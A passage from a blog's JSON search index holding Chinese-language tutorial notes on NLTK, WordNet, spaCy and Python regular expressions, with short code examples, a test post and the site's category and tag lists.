WordNetLemmatizerlemmatizer = WordNetLemmatizer()lemmatizer.lemmatize(\"makes\")# If you do not provide POS tag of the word, # lemmatizer will consider word as a noun and you may not get the result you expected lemmatizer.lemmatize('spoken')# Out: 'spoken'# 给出词性lemmatizer.lemmatize('spoken','v')# Out: 'speak' NLTK：WordNet ​ NLTK，全称Natural Language Toolkit，自然语言处理工具包，是NLP研究领域常用的一个Python库，由宾夕法尼亚大学的Steven Bird和Edward Loper在Python的基础上开发的一个模块，至今已有超过十万行的代码。这是一个开源项目，包含数据集、Python模块、教程等；NLTK是最常用的英文自然语言处理python基础库之一。 Corpus Module Corpus WordNet与词义解析 1234567891011121314151617181920from nltk.corpus import wordnet as wn# 同义wn.synsets('man')# 第一种词义wn.synsets('man')[0].definition()# 第二种词义wn.synsets('man')[1].definition()# 造句：选择一种词义（dog.n.01）dog = wn.synset('dog.n.01')dog.examples()[0]# 上位词dog.hypernyms()# 查看不同词义下的Lemmatization解析for syn in wn.synsets('spoken'): print(syn,':', syn.lemma_names()) Frequency Distribution 12345678910111213141516171819202122232425262728293031from nltk import ConditionalFreqDist, FreqDist...fd = FreqDist(l)fd.most_common(2)# Return a list of all samples that occur oncefd.hapaxes()# Find the word occuring max number of timesfd_w_humor.max()# Freq = Number of occurences / total number of wordsfd_w_humor.freq('the')# check how many times word 'pen' appearedfd_w_humor.get('pen')...# Conditional Frequency Distribution# Use tabulate mathod to check distribution of modal words in different genre cfd = ConditionalFreqDist( (genre, word) for genre in brown.categories() for word in brown.words(categories=genre))cfd.tabulate(conditions=genres, samples=modals)# 绘制分布图l_names = ([('male',name[-1]) for name in names.words('male.txt')] + [('female',name[-1]) for name in names.words('female.txt')]) cfd_names = ConditionalFreqDist(l_names)cfd_names.plot() SpaCy ​ spaCy是Python和Cython中的高级自然语言处理库，它建立在最新的研究基础之上，从一开始就设计用于实际产品。spaCy 带有预先训练的统计模型和单词向量，目前支持 20 多种语言的标记。它具有快速的句法分析器，用于标签的卷积神经网络模型，解析和命名实体识别以及与深度学习整合。 ​ !pip install -i https://pypi.tuna.tsinghua.edu.cn/simple spaCy ​ !python -m spacy download en ​ 支持的语言 ​ 123456789101112131415161718192021222324252627282930313233# Tokenizationimport spacynlp = spacy.load('en')doc = nlp('Hello World!')for token in doc: print('\"' + token.text + '\"') for token in doc: print(\"&#123;0&#125;\\t&#123;1&#125;\\t&#123;2&#125;\\t&#123;3&#125;\\t&#123;4&#125;\\t&#123;5&#125;\\t&#123;6&#125;\\t&#123;7&#125;\".format( token.text, token.idx, # 开始index token.lemma_, # 原型 token.is_punct,# 判断标点 token.is_space,# 判断空格 token.shape_, # 词格式 token.pos_, # 词性 token.tag_ # 标注 )) # 断句for sent in doc.sents: print(sent) # 词性标注print([(token.text, token.tag_) for token in doc])# NERfor ent in doc.ents: print(ent.text, ent.label_) ​ BIO/IOB tagging 是一种对给定句子中的单元做序列标注的方式，用于从给定句子中抽取连续字/词块构成的有意义短语。 ​ 每个词标注为B（Beginning，指示某短语起始）、I（Inside，指示短语内部）、O（Outside，指示不在短语中）中的一个。如：B-人名 O B-机构名 I-机构名 1234567891011iob_tagged = [ (token.text, token.tag_, \"&#123;0&#125;-&#123;1&#125;\".format(token.ent_iob_, token.ent_type_) if token.ent_iob_ != 'O' else token.ent_iob_) for token in doc]ent_iob = [(token.ent_iob_, token.ent_type_) for token in doc]from nltk.chunk import conlltags2tree# 按照nltk.Tree的格式显示print(conlltags2tree(iob_tagged)) ​ 可视化 12345from spacy import displacydisplacy.render(doc, style='ent', jupyter=True)displacy.render(doc, style='dep', jupyter=True) image chunking/组块分析 12for chunk in doc.noun_chunks: print(chunk.text,'---', chunk.label_,'---', chunk.root.text) 句法依存 12345for token in doc: print(\"&#123;0&#125;/&#123;1&#125; &lt;--&#123;2&#125;-- &#123;3&#125;/&#123;4&#125;\".format( token.text, token.tag_, token.dep_, token.head.text, token.head.tag_)) #head displacy.render(doc, style='dep', jupyter=True, options=&#123;'distance': 90&#125;) 词向量 1234567891011121314151617# 如果要使用英文的词向量，需要先下载预先训练好的结果# !python -m spacy download en_core_web_lgnlp = spacy.load('en_core_web_lg')print(nlp.vocab['banana'].vector)# 在词向量的基础上，spaCy提供了从词到文档的相似度计算的方法target = nlp(\"Cats are beautiful animals.\") doc1 = nlp(\"Dogs are awesome.\")doc2 = nlp(\"Some gorgeous creatures are felines.\")doc3 = nlp(\"Dolphins are swimming mammals.\") print(target.similarity(doc1)) # 0.8901765218466683print(target.similarity(doc2)) # 0.9115828449161616print(target.similarity(doc3)) # 0.7822956752876101","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"english process","slug":"english-process","permalink":"https://racleray.github.io/tags/english-process/"},{"name":"nltk","slug":"nltk","permalink":"https://racleray.github.io/tags/nltk/"}]},{"title":"常用python文本处理函数","slug":"常用python文本处理函数","date":"2020-07-06T12:27:20.000Z","updated":"2023-08-07T11:54:31.041Z","comments":true,"path":"posts/9ad55c64.html","link":"","permalink":"https://racleray.github.io/posts/9ad55c64.html","excerpt":"记录python基本文本处理函数，以及正则表达式模块使用。","text":"python函数 1234567891011121314151617# 去空格及特殊符号 en_str.strip().lstrip().rstrip(',') # 字符串替换en_str.replace('hello', 'hi')# 删除zh_str.strip().replace('大家好，', '')# 通过join的方式连接\"，\".join(strs)或者str1+str2# 通过split的方式切分tmp_str.split(\"；\") 12345678910# 以字母序排列，注意是以返回值形态返回排序结果，不改变原listsorted(en_strs)sorted(en_strs, key=lambda x:x[2].lower())# 查找可以用index和findzh_str.index(\"陆超\") # 第一个indexzh_str.find(\"来了老弟\") # 返回-1，不会报错 12345678# 大小写与其他变化en_str.title()a = en_str.translate(en_str)en_str.lower().upper()en_str.capitalize() # capitalize 函数帮助（help(func)） 正则表达式 正则表达式是处理字符串的强大工具，拥有独特的语法和独立的处理引擎。 http://regexr.com/ https://alf.nu/RegexGolf 练习地址 re模块 12345678910111213# encoding: UTF-8import re # 将正则表达式编译成Pattern对象pattern = re.compile(r'hello.*\\!') # 使用Pattern匹配文本，获得匹配结果，无法匹配时将返回Nonematch = pattern.match('hello, hanxiaoyang! How are you?')# match从头开始匹配 if match: # 使用Match获得分组信息 print match.group() ​ re.compile('pattern', re.I | re.M) ：re.I(re.IGNORECASE): 忽略大小写（括号内是完整写法，下同） re.M(MULTILINE): 多行模式，改变'^'和'$'的行为。 ​ Match对象是一次匹配的结果，包含了很多关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息 1re.match ​ Pattern对象是一个编译好的正则表达式，通过Pattern提供的一系列方法可以对文本进行匹配查找。 ​ Pattern不能直接实例化，必须使用re.compile()进行构造。 12345678# Pattern提供了几个可读属性用于获取表达式的相关信息：# pattern: 编译时用的表达式字符串。# flags: 编译时用的匹配模式。数字形式。# groups: 表达式中分组的数量。# groupindex: 以表达式中有别名的组的别名为键、以该组对应的编号为值的字典，没有别名的组不包含在内。# re.S(DOTALL): 点任意匹配模式re.compile(r'(\\w+) (\\w+)(?P&lt;sign&gt;.*)', re.DOTALL) 使用pattern match(string[, pos[, endpos]]) | re.match(pattern, string[, flags]): 这个方法将从string的pos下标处起尝试匹配pattern 如果pattern结束时仍可匹配，则返回一个Match对象 如果匹配过程中pattern无法匹配，或者匹配未结束就已到达endpos，则返回None。 pos和endpos的默认值分别为0和len(string)。 注意：这个方法并不是完全匹配。当pattern结束时若string还有剩余字符，仍然视为成功。想要完全匹配，可以在表达式末尾加上边界匹配符'$'。 search(string[, pos[, endpos]]) | re.search(pattern, string[, flags]): 这个方法从string的pos下标处起尝试匹配pattern sub(repl, string[, count]) | re.sub(pattern, repl, string[, count]): 使用repl替换string中每一个匹配的子串后返回替换后的字符串。 当repl是一个字符串时，可以使用、，但不能使用编号0。 当repl是一个方法时，这个方法应当只接受一个参数（Match对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。 count用于指定最多替换次数，不指定时全部替换。 split(string[, maxsplit]) | re.split(pattern, string[, maxsplit]): 按照能够匹配的子串将string分割后返回列表。maxsplit 用于指定最大分割次数，不指定将全部分割。 12p = re.compile(r'\\d+')print(p.split('one1two2three3four4')) findall(string[, pos[, endpos]]) | re.findall(pattern, string[, flags]): 搜索string，以列表形式返回全部能匹配的子串。 12p = re.compile(r'\\d+')print(p.findall('one1two2three3four4') finditer(string[, pos[, endpos]]) | re.finditer(pattern, string[, flags]): 搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。 123p = re.compile(r'\\d+')for m in p.finditer('one1two2three3four4'): print(m.group()) subn(repl, string[, count]) |re.subn(pattern, repl, string[, count]): 返回 (sub(repl, string[, count]), 替换次数)。 123456789p = re.compile(r'(\\w+) (\\w+)')s = 'i say, hello world!' print(p.subn(r'\\2 \\1', s)) def func(m): return m.group(1).title() + ' ' + m.group(2).title() print(p.subn(func, s)) 词条和解释抽取 12345678910111213141516171819202122# 引入爬虫工具库import requests as rqimport re# 发送请求page = rq.get(\"https://baike.sogou.com/v231013.htm\")# 返回状态码正常page.status_code# 词条正则表达式抽取title_pattern = re.compile(r'&lt;h1 id=\"title\".*?&gt;(.*?)&lt;/h1&gt;') title = title_pattern.search(page.text) print(title.group(1))# 词条正则表达式抽取content_pattern = re.compile(r'&lt;p&gt;(.*?)&lt;\\\\/p&gt;') contents = content_pattern.findall(page.text) print(contents)list(map(lambda x:re.sub(\"&lt;a .*?&gt;|&lt;\\\\\\/[ab]&gt;\", \"\",x), contents))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"regex","slug":"regex","permalink":"https://racleray.github.io/tags/regex/"}]},{"title":"hello","slug":"hello","date":"2020-04-15T16:41:05.000Z","updated":"2023-08-07T11:54:31.036Z","comments":true,"path":"posts/3610a686.html","link":"","permalink":"https://racleray.github.io/posts/3610a686.html","excerpt":"第一篇Blog，测试用。","text":"便签 可选便签： 12345678910111213primarysecondarysuccessdangerwarninginfolight Hello World. Hello World. 行内标签 勾选框 普通示例 默认选中 内联示例 后面文字不换行 也可以只传入一个参数，文字写在后边（这样不支持外联） 按钮 url：跳转链接 text：显示的文字 title：鼠标悬停时显示的文字（可选） text text 组图 total：图片总数量，对应中间包含的图片 url 数量 n1-n2-...：每行的图片数量，可以省略，默认单行最多 3 张图，求和必须相等于 total，否则按默认样式 Mermaid 流程图 mermaid: true 才会在文章页启动流程图渲染","categories":[],"tags":[]}],"categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"},{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Terminal","slug":"Tools/Terminal","permalink":"https://racleray.github.io/categories/Tools/Terminal/"},{"name":"Memory","slug":"Notes/Memory","permalink":"https://racleray.github.io/categories/Notes/Memory/"},{"name":"Nginx","slug":"Notes/Nginx","permalink":"https://racleray.github.io/categories/Notes/Nginx/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"},{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"Meditation","slug":"Poetry/Meditation","permalink":"https://racleray.github.io/categories/Poetry/Meditation/"},{"name":"1","slug":"Poetry/1","permalink":"https://racleray.github.io/categories/Poetry/1/"},{"name":"Coroutine","slug":"Notes/Coroutine","permalink":"https://racleray.github.io/categories/Notes/Coroutine/"},{"name":"Web","slug":"Notes/Web","permalink":"https://racleray.github.io/categories/Notes/Web/"},{"name":"DataBase","slug":"Notes/DataBase","permalink":"https://racleray.github.io/categories/Notes/DataBase/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"CUDA","slug":"Notes/CUDA","permalink":"https://racleray.github.io/categories/Notes/CUDA/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"},{"name":"RPC","slug":"Notes/RPC","permalink":"https://racleray.github.io/categories/Notes/RPC/"},{"name":"CMake","slug":"Notes/CMake","permalink":"https://racleray.github.io/categories/Notes/CMake/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"},{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/categories/Distributed-System/"},{"name":"Linux Kernel","slug":"Notes/Linux-Kernel","permalink":"https://racleray.github.io/categories/Notes/Linux-Kernel/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"C#","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"},{"name":"hack","slug":"Notes/hack","permalink":"https://racleray.github.io/categories/Notes/hack/"},{"name":"C++","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"},{"name":"Database","slug":"Notes/Database","permalink":"https://racleray.github.io/categories/Notes/Database/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"},{"name":"C","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"},{"name":"Design Patterns","slug":"Notes/Design-Patterns","permalink":"https://racleray.github.io/categories/Notes/Design-Patterns/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"},{"name":"Math","slug":"Math","permalink":"https://racleray.github.io/categories/Math/"},{"name":"basic","slug":"Math/basic","permalink":"https://racleray.github.io/categories/Math/basic/"},{"name":"Distillation","slug":"Notes/Distillation","permalink":"https://racleray.github.io/categories/Notes/Distillation/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"},{"name":"Data Augmentation","slug":"Notes/Data-Augmentation","permalink":"https://racleray.github.io/categories/Notes/Data-Augmentation/"},{"name":"Contrastive Learning","slug":"Notes/Contrastive-Learning","permalink":"https://racleray.github.io/categories/Notes/Contrastive-Learning/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"},{"name":"Algorithm","slug":"Notes/Algorithm","permalink":"https://racleray.github.io/categories/Notes/Algorithm/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"},{"name":"spark","slug":"Tools/spark","permalink":"https://racleray.github.io/categories/Tools/spark/"},{"name":"git","slug":"Tools/git","permalink":"https://racleray.github.io/categories/Tools/git/"},{"name":"Docker","slug":"Tools/Docker","permalink":"https://racleray.github.io/categories/Tools/Docker/"},{"name":"Linux","slug":"Tools/Linux","permalink":"https://racleray.github.io/categories/Tools/Linux/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"},{"name":"terminal","slug":"terminal","permalink":"https://racleray.github.io/tags/terminal/"},{"name":"configure","slug":"configure","permalink":"https://racleray.github.io/tags/configure/"},{"name":"Memory Pool","slug":"Memory-Pool","permalink":"https://racleray.github.io/tags/Memory-Pool/"},{"name":"Memory","slug":"Memory","permalink":"https://racleray.github.io/tags/Memory/"},{"name":"NGINX","slug":"NGINX","permalink":"https://racleray.github.io/tags/NGINX/"},{"name":"Server Design","slug":"Server-Design","permalink":"https://racleray.github.io/tags/Server-Design/"},{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Network","slug":"Network","permalink":"https://racleray.github.io/tags/Network/"},{"name":"Socket","slug":"Socket","permalink":"https://racleray.github.io/tags/Socket/"},{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"},{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"},{"name":"Coroutine","slug":"Coroutine","permalink":"https://racleray.github.io/tags/Coroutine/"},{"name":"HTTP","slug":"HTTP","permalink":"https://racleray.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"DataBase","slug":"DataBase","permalink":"https://racleray.github.io/tags/DataBase/"},{"name":"CUDA","slug":"CUDA","permalink":"https://racleray.github.io/tags/CUDA/"},{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"},{"name":"RPC","slug":"RPC","permalink":"https://racleray.github.io/tags/RPC/"},{"name":"memory manage","slug":"memory-manage","permalink":"https://racleray.github.io/tags/memory-manage/"},{"name":"Template","slug":"Template","permalink":"https://racleray.github.io/tags/Template/"},{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"CMake","slug":"CMake","permalink":"https://racleray.github.io/tags/CMake/"},{"name":"Compiler","slug":"Compiler","permalink":"https://racleray.github.io/tags/Compiler/"},{"name":"Unix","slug":"Unix","permalink":"https://racleray.github.io/tags/Unix/"},{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"},{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/tags/Distributed-System/"},{"name":"CAP","slug":"CAP","permalink":"https://racleray.github.io/tags/CAP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://racleray.github.io/tags/Nginx/"},{"name":"Linux Kernel","slug":"Linux-Kernel","permalink":"https://racleray.github.io/tags/Linux-Kernel/"},{"name":"C-sharp","slug":"C-sharp","permalink":"https://racleray.github.io/tags/C-sharp/"},{"name":"hack","slug":"hack","permalink":"https://racleray.github.io/tags/hack/"},{"name":"kali","slug":"kali","permalink":"https://racleray.github.io/tags/kali/"},{"name":"Python","slug":"Python","permalink":"https://racleray.github.io/tags/Python/"},{"name":"Optimize","slug":"Optimize","permalink":"https://racleray.github.io/tags/Optimize/"},{"name":"String","slug":"String","permalink":"https://racleray.github.io/tags/String/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"},{"name":"STL","slug":"STL","permalink":"https://racleray.github.io/tags/STL/"},{"name":"optimizer","slug":"optimizer","permalink":"https://racleray.github.io/tags/optimizer/"},{"name":"lookahead","slug":"lookahead","permalink":"https://racleray.github.io/tags/lookahead/"},{"name":"Database","slug":"Database","permalink":"https://racleray.github.io/tags/Database/"},{"name":"MySQL","slug":"MySQL","permalink":"https://racleray.github.io/tags/MySQL/"},{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"prompt","slug":"prompt","permalink":"https://racleray.github.io/tags/prompt/"},{"name":"adaptor","slug":"adaptor","permalink":"https://racleray.github.io/tags/adaptor/"},{"name":"epoll","slug":"epoll","permalink":"https://racleray.github.io/tags/epoll/"},{"name":"测试框架","slug":"测试框架","permalink":"https://racleray.github.io/tags/%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"},{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"design patterns","slug":"design-patterns","permalink":"https://racleray.github.io/tags/design-patterns/"},{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"math","slug":"math","permalink":"https://racleray.github.io/tags/math/"},{"name":"searching","slug":"searching","permalink":"https://racleray.github.io/tags/searching/"},{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"topic model","slug":"topic-model","permalink":"https://racleray.github.io/tags/topic-model/"},{"name":"BP","slug":"BP","permalink":"https://racleray.github.io/tags/BP/"},{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"SimCSE","slug":"SimCSE","permalink":"https://racleray.github.io/tags/SimCSE/"},{"name":"initialization","slug":"initialization","permalink":"https://racleray.github.io/tags/initialization/"},{"name":"knowledge distillation","slug":"knowledge-distillation","permalink":"https://racleray.github.io/tags/knowledge-distillation/"},{"name":"CRD","slug":"CRD","permalink":"https://racleray.github.io/tags/CRD/"},{"name":"SRRD","slug":"SRRD","permalink":"https://racleray.github.io/tags/SRRD/"},{"name":"NCE","slug":"NCE","permalink":"https://racleray.github.io/tags/NCE/"},{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"data augmentation","slug":"data-augmentation","permalink":"https://racleray.github.io/tags/data-augmentation/"},{"name":"self-supervise","slug":"self-supervise","permalink":"https://racleray.github.io/tags/self-supervise/"},{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"},{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"},{"name":"jupyter","slug":"jupyter","permalink":"https://racleray.github.io/tags/jupyter/"},{"name":"pointer net","slug":"pointer-net","permalink":"https://racleray.github.io/tags/pointer-net/"},{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"FLAT","slug":"FLAT","permalink":"https://racleray.github.io/tags/FLAT/"},{"name":"methodology","slug":"methodology","permalink":"https://racleray.github.io/tags/methodology/"},{"name":"algorithm","slug":"algorithm","permalink":"https://racleray.github.io/tags/algorithm/"},{"name":"kmp","slug":"kmp","permalink":"https://racleray.github.io/tags/kmp/"},{"name":"trie","slug":"trie","permalink":"https://racleray.github.io/tags/trie/"},{"name":"Aho-Corasick","slug":"Aho-Corasick","permalink":"https://racleray.github.io/tags/Aho-Corasick/"},{"name":"ray","slug":"ray","permalink":"https://racleray.github.io/tags/ray/"},{"name":"distributed","slug":"distributed","permalink":"https://racleray.github.io/tags/distributed/"},{"name":"asyc","slug":"asyc","permalink":"https://racleray.github.io/tags/asyc/"},{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"tool","slug":"tool","permalink":"https://racleray.github.io/tags/tool/"},{"name":"TransE","slug":"TransE","permalink":"https://racleray.github.io/tags/TransE/"},{"name":"Knowledge Graph","slug":"Knowledge-Graph","permalink":"https://racleray.github.io/tags/Knowledge-Graph/"},{"name":"sampling","slug":"sampling","permalink":"https://racleray.github.io/tags/sampling/"},{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"},{"name":"CRF","slug":"CRF","permalink":"https://racleray.github.io/tags/CRF/"},{"name":"spark","slug":"spark","permalink":"https://racleray.github.io/tags/spark/"},{"name":"normalization","slug":"normalization","permalink":"https://racleray.github.io/tags/normalization/"},{"name":"gan","slug":"gan","permalink":"https://racleray.github.io/tags/gan/"},{"name":"c++","slug":"c","permalink":"https://racleray.github.io/tags/c/"},{"name":"library","slug":"library","permalink":"https://racleray.github.io/tags/library/"},{"name":"capsule","slug":"capsule","permalink":"https://racleray.github.io/tags/capsule/"},{"name":"git","slug":"git","permalink":"https://racleray.github.io/tags/git/"},{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"DSSM","slug":"DSSM","permalink":"https://racleray.github.io/tags/DSSM/"},{"name":"CDSSM","slug":"CDSSM","permalink":"https://racleray.github.io/tags/CDSSM/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"doc2vec","slug":"doc2vec","permalink":"https://racleray.github.io/tags/doc2vec/"},{"name":"SimHash","slug":"SimHash","permalink":"https://racleray.github.io/tags/SimHash/"},{"name":"visual text","slug":"visual-text","permalink":"https://racleray.github.io/tags/visual-text/"},{"name":"rasa","slug":"rasa","permalink":"https://racleray.github.io/tags/rasa/"},{"name":"retireval","slug":"retireval","permalink":"https://racleray.github.io/tags/retireval/"},{"name":"transformer","slug":"transformer","permalink":"https://racleray.github.io/tags/transformer/"},{"name":"cnn","slug":"cnn","permalink":"https://racleray.github.io/tags/cnn/"},{"name":"Fairseq","slug":"Fairseq","permalink":"https://racleray.github.io/tags/Fairseq/"},{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"},{"name":"bleu","slug":"bleu","permalink":"https://racleray.github.io/tags/bleu/"},{"name":"rouge","slug":"rouge","permalink":"https://racleray.github.io/tags/rouge/"},{"name":"evaluation","slug":"evaluation","permalink":"https://racleray.github.io/tags/evaluation/"},{"name":"attention","slug":"attention","permalink":"https://racleray.github.io/tags/attention/"},{"name":"lda","slug":"lda","permalink":"https://racleray.github.io/tags/lda/"},{"name":"fine-grained","slug":"fine-grained","permalink":"https://racleray.github.io/tags/fine-grained/"},{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"},{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"CNN","slug":"CNN","permalink":"https://racleray.github.io/tags/CNN/"},{"name":"RNN","slug":"RNN","permalink":"https://racleray.github.io/tags/RNN/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"},{"name":"pretrained LM","slug":"pretrained-LM","permalink":"https://racleray.github.io/tags/pretrained-LM/"},{"name":"XLNet","slug":"XLNet","permalink":"https://racleray.github.io/tags/XLNet/"},{"name":"smoothing","slug":"smoothing","permalink":"https://racleray.github.io/tags/smoothing/"},{"name":"KenLM","slug":"KenLM","permalink":"https://racleray.github.io/tags/KenLM/"},{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://racleray.github.io/tags/Docker/"},{"name":"NVIDIA Container Toolkit","slug":"NVIDIA-Container-Toolkit","permalink":"https://racleray.github.io/tags/NVIDIA-Container-Toolkit/"},{"name":"chinese process","slug":"chinese-process","permalink":"https://racleray.github.io/tags/chinese-process/"},{"name":"basic","slug":"basic","permalink":"https://racleray.github.io/tags/basic/"},{"name":"english process","slug":"english-process","permalink":"https://racleray.github.io/tags/english-process/"},{"name":"nltk","slug":"nltk","permalink":"https://racleray.github.io/tags/nltk/"},{"name":"regex","slug":"regex","permalink":"https://racleray.github.io/tags/regex/"}]}